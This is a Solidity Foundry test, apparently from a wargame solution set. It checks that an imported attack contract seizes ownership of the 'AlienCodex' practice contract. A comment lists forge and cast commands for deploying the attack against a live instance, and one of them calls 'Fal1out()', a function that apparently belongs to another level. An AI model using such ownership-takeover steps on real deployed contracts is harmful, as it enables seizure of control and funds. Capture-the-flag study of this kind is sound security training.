// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {AlienCodex} from "../src/AlienCodex.sol";
import {AlienCodexAttack} from "../solutions/AlienCodexAttack.sol";

contract AlienCodexTest is Test {
    AlienCodex public codex;
    AlienCodexAttack public attackContract;
    address public attacker;

    function setUp() public {
        codex = new AlienCodex();
        attacker = makeAddr("attacker");
    }

    function test_attackAlienCodex() public {
        vm.startPrank(attacker);

        attackContract = new AlienCodexAttack(address(codex));
        attackContract.attack();
        assertEq(codex.owner(), attacker);

        vm.stopPrank();
    }
}

/* 
Instance address: 0x650EAB22f626d7B6D15893D444e12C4f027bA40c
source .env
export codex=0x650EAB22f626d7B6D15893D444e12C4f027bA40c
forge create solutions/AlienCodexAttack.sol:AlienCodexAttack --rpc-url $RPC_URL --private-key $PRIVATE_KEY --constructor-args $codex
cast send $codex "Fal1out()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast call $codex "owner()" --rpc-url $RPC_URL
cast call $codex "contact()" --rpc-url $RPC_URL

forge test --match-test test_attackAlienCodex --fork-url $RPC_URL
*/
